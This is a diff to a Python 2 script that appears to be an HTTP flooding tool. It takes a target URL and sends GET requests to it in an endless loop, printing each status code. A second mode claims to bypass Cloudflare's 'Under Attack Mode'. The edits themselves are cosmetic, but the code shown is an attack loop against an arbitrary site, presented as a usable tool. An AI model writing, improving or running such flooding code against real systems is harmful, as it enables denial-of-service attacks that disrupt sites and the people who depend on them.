@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 # :D
-import sys,os,random,threading,urllib3
+import sys,os,random
 if sys.platform == "linux" or sys.platform == "linux2":
     os.system("clear")
 elif sys.platform == "win32":
@@ -83,12 +83,12 @@ mode = raw_input("[*] Select Mode: ")
 print("================================================")
 if mode == '1':
 	print("- [1] Checking Target: "+"["+u+"]"+ " HTTP Status Code Normal:")
+	print("                          Ctrl + C to stop                     ")
 	while True:
             try:
                 i = random.choice(("[!]", "[@]", "[~]", "[+]", "[-]"))
-                r = requests.get(u)
-                code = r.status_code
-                print i,"Sending HTTP-Requests to " + "[" + u + "]" + " => " + "Status: ["+str(code)+"]"
+                r = requests.get(u).status_code
+                print i,"Sending HTTP-Requests to " + "[" + u + "]" + " => " + "Status: ["+str(r)+"]"
             except KeyboardInterrupt:
                 print('./Exiting, Have fun day ;)')
                 sys.exit(0)  
@@ -97,6 +97,7 @@ if mode == '1':
                 sys.exit(1)  
 elif mode == '2':
     print("+ [2] Checking Target: "+"["+u+"]"+ " HTTP Status Code Bypass Cloudflare UAM:") 
+    print("                          Ctrl + C to stop                     ")
     while True:
         try:
             i = random.choice(("[!]", "[@]", "[~]", "[+]", "[-]"))
